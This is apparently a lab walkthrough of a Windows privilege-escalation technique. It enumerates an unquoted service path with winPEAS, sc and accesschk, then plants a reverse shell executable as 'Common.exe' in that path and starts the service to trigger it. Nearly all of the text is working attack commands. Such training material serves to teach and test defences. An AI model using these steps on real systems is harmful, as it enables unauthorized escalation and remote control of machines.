1.Run winPEAS to check for service misconfigurations:

` .\winPEASany.exe quiet servicesinfo`

2.Note that the “unquotedsvc” service has an unquoted path that also contains spaces:

```
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```


3.Confirm this using sc:
```
sc qc unquotedsvc
```


4.Use accesschk.exe to check for write permissions:

```
 .\accesschk.exe /accepteula -uwdq C:\
 
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
 
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

5.Copy the reverse shell executable and rename it appropriately:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

6.Start a listener on Kali, and then start the service to trigger the exploit:

```
net start unquotedsvc
```